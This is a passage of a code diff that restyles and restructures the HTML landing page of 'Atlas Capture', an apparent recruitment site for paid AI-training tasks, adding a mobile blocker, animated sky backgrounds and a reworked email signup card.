@@ -1,529 +1,1777 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>Atlas Capture</title>
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/50b4D1L0/images.png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Atlas Capture</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
-
-body{
-  background:#f3f4f6;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  min-height:100vh;
-  padding:40px 10px;
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Inter, sans-serif;
 }
 
-.wrapper{max-width:420px;width:100%}
-
-.header{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  gap:10px;
-  margin-bottom:18px;
-}
-.logo{
-  width:34px;height:34px;
-  border-radius:8px;
-  background:#4f46e5;
-}
-.header span{font-weight:600;font-size:18px}
-
-.card{
-  background:#fff;
-  border-radius:22px;
-  padding:28px 22px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.08);
+.desktop-blocker {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: 10000;
+    background: #07061d;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
 }
 
-.badge{
-  display:inline-flex;
-  align-items:center;
-  gap:6px;
-  background:#eef2ff;
-  color:#4f46e5;
-  padding:5px 10px;
-  border-radius:999px;
-  font-size:12px;
-  margin-bottom:14px;
+.desktop-blocker .blocker-content {
+    max-width: 420px;
+    width: 100%;
+    padding: 24px 18px 32px;
+    text-align: center;
+    box-sizing: border-box;
 }
 
-h1{
-  font-size:22px;
-  text-align:center;
-  font-weight:700;
-  line-height:1.3;
-  margin-bottom:10px;
-}
-.highlight{color:#2563eb}
-
-.desc{
-  text-align:center;
-  color:#6b7280;
-  font-size:13px;
-  margin-bottom:18px;
-  line-height:1.5;
+.desktop-blocker .monitor-icon {
+    width: 65px;
+    height: 65px;
+    border-radius: 25%;
+    padding: 16px;
+    margin: 0 auto 18px;
+    display: block;
+    color: #cbd5e1;
+    background-color: #1e293b;
 }
 
-.stats{
-  display:flex;
-  justify-content:space-between;
-  margin-bottom:18px;
-}
-.stat{text-align:center}
-.stat strong{color:#2563eb;font-size:16px}
-.stat span{font-size:11px;color:#6b7280}
-
-.features{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:10px 8px;
-  margin-bottom:16px;
-}
-.feature{
-  display:flex;
-  align-items:center;
-  gap:8px;
-  font-size:12px;
-}
-.icon{
-  width:28px;height:28px;
-  background:#eef2ff;
-  border-radius:8px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-.icon svg{
-  width:14px;height:14px;
-  stroke:#2563eb;
-  stroke-width:1.5;
+.desktop-blocker .heading {
+    color: #ffffff;
+    font-size: 29px;
+    line-height: 1.1;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    margin-bottom: 14px;
+    text-shadow: 0 0 14px rgba(255,255,255,0.18);
+    background: #fff;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
 }
 
-.checks{
-  display:flex;
-  justify-content:space-between;
-  font-size:12px;
-  color:#059669;
-  margin-bottom:18px;
+.desktop-blocker .description {
+    color: #94a3b8;
+    font-size: 16px;
+    line-height: 1.45;
+    font-weight: 600;
+    text-shadow: 0 0 10px rgba(0,0,0,0.22);
+    max-width: 360px;
+    margin: 0 auto;
+    background:#94a3b8;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
 }
 
-label{font-size:12px;color:#374151;font-weight:500;margin-bottom:4px;display:block}
-input{
-  width:100%;
-  padding:10px 12px;
-  border-radius:10px;
-  border:1px solid #e5e7eb;
-  font-size:14px;
-  margin-bottom:14px;
-}
-input:focus{
-  outline:none;
-  border-color:#4f46e5;
-  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
-}
-input.error{
-  border-color:#ef4444;
+@media (max-width: 900px) {
+    .desktop-blocker {
+        display: flex !important;
+    }
+    body > .wrapper,
+    body > .wrapper2,
+    body > a[href="https://atlascapture.io"] {
+        display: none !important;
+    }
 }
 
-.checkbox{
-  display:flex;
-  align-items:center;
-  gap:8px;
-  font-size:12px;
-  margin-bottom:18px;
-}
-.checkbox input{
-  width:16px;
-  height:16px;
-  margin:0;
-}
-
-button{
-  width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:none;
-  background:linear-gradient(90deg,#2563eb,#7c3aed);
-  color:#fff;
-  font-weight:600;
-  font-size:14px;
-  cursor:pointer;
-  transition:all 0.2s;
-  margin-bottom:14px;
-}
-button:hover:not(:disabled){
-  transform:translateY(-1px);
-  box-shadow:0 4px 12px rgba(37,99,235,0.3);
-}
-button:disabled{
-  opacity:0.7;
-  cursor:not-allowed;
-  transform:none;
-}
-.button-loading{
-  display:inline-flex;
-  align-items:center;
-  gap:8px;
-}
-.spinner{
-  width:16px;
-  height:16px;
-  border:2px solid rgba(255,255,255,0.3);
-  border-top-color:white;
-  border-radius:50%;
-  animation:spin 0.8s linear infinite;
-}
-@keyframes spin{
-  to{transform:rotate(360deg);}
+@media (max-width: 480px) {
+    .desktop-blocker .heading {
+        font-size: 24px;
+    }
+    .desktop-blocker .description {
+        font-size: 15px;
+    }
+    .desktop-blocker .monitor-icon {
+        width: 64px;
+        height: 64px;
+    }
+    .desktop-blocker .blocker-content {
+        padding: 16px 12px 24px;
+    }
 }
 
-.footer{
-  text-align:center;
-  font-size:10px;
-  color:#9ca3af;
-}
-.footer a{
-  color:#4f46e5;
-  text-decoration:none;
-}
-
-.testimonial{
-  margin-top:20px;
-  padding-top:16px;
-  border-top:1px solid #e5e7eb;
-  text-align:center;
-}
-.stars{
-  color:#f5b342;
-  font-size:14px;
-  letter-spacing:2px;
-  margin-bottom:8px;
-}
-.testimonial-text{
-  font-size:12px;
-  color:#374151;
-  font-style:italic;
-  margin-bottom:8px;
-}
-.testimonial-author{
-  font-size:11px;
-  color:#6b7280;
-}
-.testimonial-author strong{
-  color:#1f2937;
+@media (max-width: 380px) {
+    .desktop-blocker .heading {
+        font-size: 21px;
+    }
+    .desktop-blocker .description {
+        font-size: 14px;
+    }
 }
 
-.error-message{
-  color:#ef4444;
-  font-size:11px;
-  margin-top:-10px;
-  margin-bottom:12px;
-  display:none;
+/* ===== ORIGINAL STYLES (unchanged below) ===== */
+@keyframes sky-fade {
+    from { opacity: 0; }
+    to { opacity: 1; }
 }
 
-.status-message{
-  text-align:center;
-  font-size:11px;
-  margin-top:10px;
-  color:#4f46e5;
-  display:none;
+@keyframes rise-in {
+    from {
+        opacity: 0;
+        transform: translate(-50%, -30%) scale(0.85);
+    }
+    to {
+        opacity: 1;
+        transform: translate(-50%, -50%) scale(1);
+    }
 }
 
-.timeout-message{
-  text-align:center;
-  font-size:11px;
-  margin-top:10px;
-  color:#ef4444;
-  background:#fef2f2;
-  padding:8px;
-  border-radius:8px;
-  display:none;
+@keyframes bob {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-14px); }
 }
 
-#logoAtlas{
-  height: 45px;
-  width: 45px;
-  border-radius: 40%;
-  margin-right: 9px;
+@keyframes twinkle {
+    0%, 100% { opacity: 0.15; }
+    50% { opacity: 1; }
 }
-</style>
+
+@keyframes drift {
+    from { transform: translateX(0); }
+    to { transform: translateX(130vw); }
+}
+
+@keyframes shoot {
+    0% { opacity: 0; transform: translate(0, 0) rotate(18deg); }
+    4% { opacity: 1; }
+    14% { opacity: 0; transform: translate(60vw, 26vh) rotate(18deg); }
+    100% { opacity: 0; }
+}
+
+@keyframes fadeInSlideDown {
+    from {
+        opacity: 0;
+        transform: translateY(-10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.animate-in {
+    animation: fadeInSlideDown 0.2s ease-out forwards;
+}
+
+@keyframes testimonialFade {
+    from {
+        opacity: 0;
+        transform: translateY(10px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.testimonial-slide {
+    display: none;
+    animation: testimonialFade 0.5s ease-out forwards;
+}
+
+.testimonial-slide.active {
+    display: block;
+}
+
+body {
+    background-attachment: fixed;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 40px 10px;
+}
+
+#skyContainer {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: -10;
+    overflow: hidden;
+    animation: sky-fade 1.2s ease-out both;
+}
+
+.sky-morning {
+    background: linear-gradient(180deg, #9dc0ea 0%, #c7d3ee 38%, #f7c9a6 74%, #ffe6c4 100%);
+}
+
+.sky-afternoon {
+    background: linear-gradient(180deg, #4a95e6 0%, #79bdf5 45%, #bfe4ff 80%, #e7f4ff 100%);
+}
+
+.sky-evening {
+    background: linear-gradient(180deg, #2b2455 0%, #7d4a86 34%, #e0683f 68%, #ffb26b 100%);
+}
+
+.sky-night {
+    background: linear-gradient(180deg, #070b1f 0%, #131a3d 45%, #242c5c 80%, #33305e 100%);
+}
+
+.sun-morning {
+    background: radial-gradient(circle at 35% 35%, #fff2c9, #ffd27a 60%, #ffb14e);
+    box-shadow: 0 0 90px 30px rgba(255, 196, 110, 0.55);
+}
+
+.sun-afternoon {
+    background: radial-gradient(circle at 40% 40%, #ffffff, #fff6c8 55%, #ffe27a);
+    box-shadow: 0 0 110px 36px rgba(255, 240, 170, 0.6);
+}
+
+.sun-evening {
+    background: radial-gradient(circle at 40% 40%, #fff1cf, #ff9d55 55%, #f06b3a);
+    box-shadow: 0 0 120px 46px rgba(255, 130, 70, 0.55);
+}
+
+.moon-night {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    background: radial-gradient(circle at 38% 34%, #ffffff, #e6ebff 60%, #c3c9ef);
+    box-shadow: 0 0 70px 18px rgba(210, 220, 255, 0.35);
+    -webkit-mask-image: radial-gradient(circle at 70% 50%, #fff 55%, black 57%);
+    mask-image: radial-gradient(circle at 70% 50%, transparent 55%, black 57%);
+}
+
+.sun-wrapper {
+    position: absolute;
+    transform: translate(-50%, -50%);
+    animation: rise-in 1.6s cubic-bezier(0.16, 1, 0.3, 1) both;
+}
+
+.sun-body {
+    position: relative;
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    animation: bob 9s ease-in-out infinite;
+}
+
+@media (min-width: 640px) {
+    .sun-body {
+        width: 112px;
+        height: 112px;
+    }
+}
+
+.cloud {
+    position: absolute;
+    border-radius: 9999px;
+    background: rgba(255, 255, 255, 0.5);
+    filter: blur(40px);
+}
+
+.star {
+    position: absolute;
+    border-radius: 9999px;
+    background: white;
+}
+
+.shooting-star {
+    position: absolute;
+    height: 1px;
+    width: 96px;
+    background: linear-gradient(to right, transparent, white, transparent);
+    top: 18%;
+    left: 10%;
+    animation: shoot 9s ease-in 3s infinite;
+}
+
+.wrapper {
+    max-width: 420px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.wrapper2 {
+    max-width: 420px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 18px;
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 15px;
+    margin-top: 20px;
+    position: relative;
+}
+
+.quote-badge {
+    position: absolute;
+    top: -12px;
+    left: 16px;
+    z-index: 10;
+    width: 28px;
+    height: 28px;
+    border-radius: 8px;
+    background: linear-gradient(to bottom right, #7288ff, #4d67fe);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.quote-badge svg {
+    width: 14px;
+    height: 14px;
+    color: white;
+    stroke: white;
+}
+
+.header {
+    display: inline-flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+    margin: 0 auto 18px auto;
+    background: rgba(255, 255, 255, 0.9);
+    padding: 8px 20px;
+    border-radius: 50px;
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+}
+
+.header span {
+    font-weight: 500;
+    font-size: 16px;
+    color: #1f2937;
+    letter-spacing: 0.05px;
+}
+
+#logoAtlas {
+    height: 30px;
+    width: 30px;
+    border-radius: 25%;
+}
+
+.card {
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 22px;
+    padding: 28px 22px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    width: 100%;
+}
+
+.badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    backdrop-filter: blur(4px);
+    background: #eef2ff;
+    color: #7288ff;
+    padding: 5px 12px;
+    border-radius: 20px;
+    border: 1px solid rgba(114, 136, 255, 0.2);
+    font-size: 12px;
+    font-weight: 500;
+    margin-bottom: 14px;
+}
+
+.badge svg {
+    width: 14px;
+    height: 14px;
+    stroke: #7288ff;
+}
+
+h1 {
+    font-size: 22px;
+    text-align: center;
+    font-weight: 700;
+    line-height: 1.3;
+    margin-bottom: 10px;
+    color: #1f2937;
+}
+
+.highlight {
+    background: linear-gradient(90deg, #7288ff, #4d67fe);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+}
+
+.desc {
+    text-align: center;
+    color: #6b7280;
+    font-size: 13px;
+    margin-bottom: 18px;
+    line-height: 1.5;
+}
+
+.stats {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    margin-bottom: 18px;
+    width: 100%;
+}
+
+.stat {
+    text-align: center;
+    padding: 12px 8px;
+    border: 1px solid rgba(114, 136, 255, 0.1);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    border-radius: 12px;
+    background: linear-gradient(to bottom right, white, #f8fafc);
+    box-shadow: 0 2px 4px -1px rgba(0, 0, 0, 0.06), 0 1px 2px -1px rgba(0, 0, 0, 0.04);
+    opacity: 70%;
+}
+
+.stat strong {
+    color: #2563eb;
+    font-size: 24px;
+    min-height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.stat span {
+    font-size: 11px;
+    color: #6b7280;
+    font-weight: 500;
+}
+
+.features {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px 8px;
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+.feature {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    text-align: left;
+    font-weight: 500;
+    color: #1f2937;
+    background: #f8fafc;
+    padding: 8px 10px;
+    border-radius: 8px;
+    border: 1px solid #f1f5f9;
+    transition: border-color 0.2s;
+    box-shadow: 0 2px 4px -1px rgba(0, 0, 0, 0.06), 0 1px 2px -1px rgba(0, 0, 0, 0.04);
+}
+
+.icon-exception {
+    width: 28px;
+    height: 28px;
+    background: rgba(13, 148, 136, 0.082);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+
+.feature:hover {
+    border-color: rgba(114, 136, 255, 0.3);
+    box-shadow: 0 4px 12px rgba(114, 136, 255, 0.08);
+}
+
+.icon {
+    width: 28px;
+    height: 28px;
+    background: #eef2ff;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+
+.icon-exception svg {
+    width: 14px;
+    height: 14px;
+    stroke: rgb(13, 148, 136);
+    stroke-width: 1.5;
+}
+
+.icon svg {
+    width: 14px;
+    height: 14px;
+    stroke: #2563eb;
+    stroke-width: 1.5;
+}
+
+.checks {
+    display: flex;
+    justify-content: center;
+    font-size: 12px;
+    margin-bottom: 18px;
+    width: 100%;
+    flex-wrap: wrap;
+    gap: 6px;
+}
+
+.checks .flex {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    opacity: 0.8;
+}
+
+.checks .flex svg {
+    background-color: #69f8db;
+    opacity: 0.8;
+    padding: 1px;
+    border-radius: 50%;
+}
+
+.checks span {
+    color: #1f2937;
+    font-weight: 500;
+}
+
+label {
+    font-size: 12px;
+    color: #374151;
+    font-weight: 500;
+    margin-bottom: 4px;
+    display: block;
+    text-align: left;
+    width: 100%;
+}
+
+input {
+    width: 100%;
+    min-width: 0;
+    height: 44px;
+    padding: 4px 12px;
+    background: rgba(255, 255, 255, 0.8);
+    border: 1px solid #e2e8f0;
+    border-radius: 6px;
+    font-size: 16px;
+    color: #0f172a;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    transition: border-color 0.2s, box-shadow 0.2s;
+    outline: none;
+    margin-bottom: 14px;
+}
+
+input::placeholder {
+    color: #94a3b8;
+}
+
+input:focus {
+    border-color: #7288ff;
+    box-shadow: 0 0 0 3px rgba(114, 136, 255, 0.2);
+    outline: none;
+}
+
+input:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+input.error {
+    border-color: #ef4444;
+}
+
+input.error:focus {
+    box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2);
+}
+
+input[type="file"] {
+    padding: 4px 0;
+}
+
+input[type="file"]::file-selector-button {
+    display: inline-flex;
+    height: 28px;
+    border: 0;
+    background: transparent;
+    font-size: 14px;
+    font-weight: 500;
+    color: #0f172a;
+    cursor: pointer;
+}
+
+@media (max-width: 640px) {
+    input {
+        font-size: 14px;
+    }
+}
+
+.checkbox {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    margin-bottom: 18px;
+    width: 100%;
+}
+
+.checkbox input {
+    width: 16px;
+    height: 16px;
+    margin: 0;
+    flex-shrink: 0;
+}
+
+.checkbox label {
+    margin: 0;
+    width: auto;
+    cursor: pointer;
+}
+
+#collegeNotice {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(114, 136, 255, 0.2);
+    background: rgba(114, 136, 255, 0.05);
+    margin-bottom: 14px;
+    width: 100%;
+    display: none;
+}
+
+#collegeNotice svg {
+    width: 20px;
+    height: 20px;
+    color: #7288ff;
+    margin-top: 2px;
+    flex-shrink: 0;
+}
+
+#collegeNotice .text-sm {
+    font-size: 14px;
+    text-align: left;
+}
+
+#collegeNotice .font-semibold {
+    font-weight: 600;
+    color: #7288ff;
+    margin: 0;
+}
+
+#collegeNotice .text-muted-foreground {
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 4px;
+}
+
+#collegeNotice .font-medium {
+    font-weight: 500;
+}
+
+#collegeNotice .text-\[#292929\] {
+    color: #292929;
+}
+
+#collegeNotice .mt-1 {
+    margin-top: 4px;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    background: linear-gradient(90deg, #2563eb, #7c3aed);
+    color: #fff;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-bottom: 14px;
+}
+
+button:hover:not(:disabled) {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+}
+
+button:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none;
+}
+
+.button-loading {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.spinner {
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.footer {
+    text-align: center;
+    font-size: 10px;
+    color: #9ca3af;
+    width: 100%;
+    margin-top: 4px;
+}
+
+.footer a {
+    color: #9ca3af;
+    text-decoration: underline;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+    color: #2563eb;
+}
+
+.error-message {
+    color: #ef4444;
+    font-size: 11px;
+    margin-top: -10px;
+    margin-bottom: 12px;
+    display: none;
+    width: 100%;
+    text-align: left;
+}
+
+.status-message {
+    text-align: center;
+    font-size: 11px;
+    margin-top: 10px;
+    color: #4f46e5;
+    display: none;
+    width: 100%;
+}
+
+.timeout-message {
+    text-align: center;
+    font-size: 11px;
+    margin-top: 10px;
+    color: #ef4444;
+    background: #fef2f2;
+    padding: 8px;
+    border-radius: 8px;
+    display: none;
+    width: 100%;
+}
+
+.new-stat-number {
+    background: linear-gradient(90deg, #7288ff, #4d67fe);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+}
+
+.new {
+    color: #6b7280;
+}
+
+.lowerTestimonialSection {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+    gap: 8px;
+}
+
+.left-group {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    gap: 6px;
+}
+
+.name-group {
+    display: flex;
+    flex-direction: column;
+    gap: 0px;
+}
+
+.lowerOuterLabel {
+    display: inline-block;
+    width: fit-content;
+    height: fit-content;
+    padding: 2px 6px;
+    border-radius: 4px;
+    flex-shrink: 0;
+    font-size: 20px;
+}
+
+.lowerInnerLabel {
+    display: inline-block;
+    width: fit-content;
+    height: fit-content;
+    padding: 0px 6px;
+    flex-shrink: 0;
+    font-weight: 600;
+    font-size: 12px;
+    color: #292929;
+}
+
+.lowerInnerLabel:last-child {
+    font-weight: 400;
+    font-size: 10px;
+    color: #6b7280;
+}
+
+.earnings-badge {
+    display: inline-block;
+    width: fit-content;
+    height: fit-content;
+    padding: 5px 10px;
+    border-radius: 20px;
+    flex-shrink: 0;
+    white-space: nowrap;
+    background: rgba(105, 248, 219, 0.15);
+    border: 1px solid rgba(105, 248, 219, 0.25);
+    font-weight: 600;
+    font-size: 10px;
+    color: #292929;
+}
+
+.dot-container {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 12px;
+}
+
+.dot {
+    height: 6px;
+    border-radius: 9999px;
+    transition: all 0.3s ease;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    background: rgba(114, 136, 255, 0.2);
+}
+
+.dot.active {
+    width: 16px;
+    background: linear-gradient(to right, #7288ff, #4d67fe);
+}
+
+.dot.inactive {
+    width: 6px;
+}
+
+.dot:hover {
+    background: rgba(114, 136, 255, 0.4);
+}
+
+.HeaderText {
+    font-weight: 500;
+    color: #292929;
+}
+
+.submitButton {
+    background: linear-gradient(to right, #7288ff, #4d67fe);
+}
+
+.submitButton:hover {
+    background: linear-gradient(to right, #5a70ff, #3d57ee);
+}
+
+.HeaderText:hover {
+    color: #7288ff;
+}
+
+@media (max-width: 480px) {
+    body {
+        padding: 20px 10px;
+    }
+    .card {
+        padding: 20px 16px;
+    }
+    .footer a {
+        color: red;
+    }
+    h1 {
+        font-size: 19px;
+    }
+    .stat strong {
+        font-size: 16px;
+        min-height: 30px;
+        color: #7288ff;
+    }
+    .features {
+        gap: 6px;
+    }
+    .feature {
+        font-size: 11px;
+        padding: 6px 8px;
+    }
+}
+
+@media (prefers-reduced-motion: reduce) {
+    * {
+        animation: none !important;
+        transition: none !important;
+    }
+}
+    </style>
 </head>
+
 <body>
-
-<div class="wrapper">
-  <div class="header">
-    <div class="iconMain">
-      <img id="logoAtlas" src="/users/atlas.png" alt="atlas logo">
+<!-- DESKTOP-ONLY BLOCKER with SVG Monitor Icon -->
+<div class="desktop-blocker">
+    <div class="blocker-content">
+        <svg class="monitor-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect width="20" height="14" x="2" y="3" rx="2"></rect>
+            <line x1="8" x2="16" y1="21" y2="21"></line>
+            <line x1="12" x2="12" y1="17" y2="21"></line>
+        </svg>
+        <div class="heading">Desktop Only</div>
+        <div class="description">
+            Please access Atlas Capture from a desktop or laptop computer. Mobile devices are not supported.
+        </div>
     </div>
-    <span>Atlas Capture</span>
-  </div>
-
-  <div class="card">
-    <div class="badge">
-      <svg width="12" height="12" viewBox="0 0 24 24" fill="#4f46e5">
-        <path d="M16 11c1.66 0 3-1.34 3-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zM8 11c1.66 0 3-1.34 3-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5C15 14.17 10.33 13 8 13zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
-      </svg>
-      Now Hiring Worldwide
-    </div>
-
-    <h1>Help Train the Next Generation of <span class="highlight">Breakthrough AI</span></h1>
-
-    <div class="desc">
-      Get paid to complete simple tasks from home. Join thousands of contributors helping build the future of AI.
-    </div>
-
-    <div class="stats">
-      <div class="stat"><strong>10,000+</strong><span>Contributors</span></div>
-      <div class="stat"><strong>$2M+</strong><span>Paid Out</span></div>
-      <div class="stat"><strong>100+</strong><span>Cities</span></div>
-    </div>
-
-    <div class="features">
-      <div class="feature"><div class="icon"><svg viewBox="0 0 24 24" fill="none"><path d="M12 1v22M17 5H9a3 3 0 000 6h6a3 3 0 010 6H7" stroke="#2563eb"/></svg></div>Competitive Pay</div>
-      <div class="feature"><div class="icon"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#2563eb"/><polyline points="12 6 12 12 16 14" stroke="#2563eb"/></svg></div>Flexible Hours</div>
-      <div class="feature"><div class="icon"><svg viewBox="0 0 24 24" fill="none"><path d="M12 2C8 2 5 5 5 9c0 5 7 13 7 13s7-8 7-13c0-4-3-7-7-7z" stroke="#2563eb"/><circle cx="12" cy="9" r="2" stroke="#2563eb"/></svg></div>Work Anywhere</div>
-      <div class="feature"><div class="icon"><svg viewBox="0 0 24 24" fill="none"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" stroke="#2563eb"/><line x1="16" y1="2" x2="16" y2="6" stroke="#2563eb"/><line x1="8" y1="2" x2="8" y2="6" stroke="#2563eb"/><line x1="3" y1="10" x2="21" y2="10" stroke="#2563eb"/></svg></div>Weekly Payouts</div>
-    </div>
-
-    <div class="checks">
-      <div>✔ No experience required</div>
-      <div>✔ Quick onboarding</div>
-    </div>
-
-    <label>Email</label>
-    <input type="email" id="email" placeholder="name@example.com">
-    <div id="emailError" class="error-message"></div>
-
-    <div class="checkbox">
-      <input type="checkbox" id="isStudent">
-      <label for="isStudent">I'm a Philippines college/university student</label>
-    </div>
-
-    <button id="submitBtn">Start Earning Today →</button>
-    
-    <div id="statusMessage" class="status-message"></div>
-    <div id="timeoutMessage" class="timeout-message"></div>
-
-    <div class="footer">
-      By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
-    </div>
-
-    <div class="testimonial">
-      <div class="stars">★★★★★</div>
-      <div class="testimonial-text">"Finally found something I can do from home that actually pays well."</div>
-      <div class="testimonial-author"><strong>Marita G.</strong> Madrid, Spain<br>Earned $5k+</div>
-    </div>
-  </div>
 </div>
 
+<div id="skyContainer" class="sky-bg"></div>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="icon">
+            <img id="logoAtlas" src="/users/atlas.png" alt="atlas logo">
+        </div>
+        <span class="HeaderText">Atlas Capture</span>
+    </div>
+
+    <div class="card">
+        <div class="badge">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M9.937 15.5A2 2 0 0 0 8.5 14.063l-6.135-1.582a.5.5 0 0 1 0-.962L8.5 9.936A2 2 0 0 0 9.937 8.5l1.582-6.135a.5.5 0 0 1 .963 0L14.063 8.5A2 2 0 0 0 15.5 9.937l6.135 1.581a.5.5 0 0 1 0 .964L15.5 14.063a2 2 0 0 0-1.437 1.437l-1.582 6.135a.5.5 0 0 1-.963 0z"/>
+                <path d="M20 3v4"/>
+                <path d="M22 5h-4"/>
+                <path d="M4 17v2"/>
+                <path d="M5 18H3"/>
+            </svg>
+            Now hiring worldwide
+        </div>
+
+        <h1>Help Train the Next Generation of <span class="highlight">Breakthrough AI</span></h1>
+
+        <div class="desc">
+            Get paid to complete simple tasks from home. Join thousands of contributors helping build the future of AI.
+        </div>
+
+        <div class="stats">
+            <div class="stat">
+                <strong id="stat1" class="new-stat-number">0</strong>
+                <span class="new">Contributors</span>
+            </div>
+            <div class="stat">
+                <strong id="stat2" class="new-stat-number">$0</strong>
+                <span class="new">Paid Out</span>
+            </div>
+            <div class="stat">
+                <strong id="stat3" class="new-stat-number">0</strong>
+                <span class="new">Cities</span>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <div class="icon"><svg viewBox="0 0 24 24" fill="none"><path d="M12 1v22M17 5H9a3 3 0 000 6h6a3 3 0 010 6H7" stroke="#2563eb" /></svg></div>Competitive Pay
+            </div>
+            <div class="feature">
+                <div class="icon"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#2563eb" /><polyline points="12 6 12 12 16 14" stroke="#2563eb" /></svg></div>Flexible Hours
+            </div>
+            <div class="feature">
+                <div class="icon-exception">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="rgb(13, 148, 136)" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/>
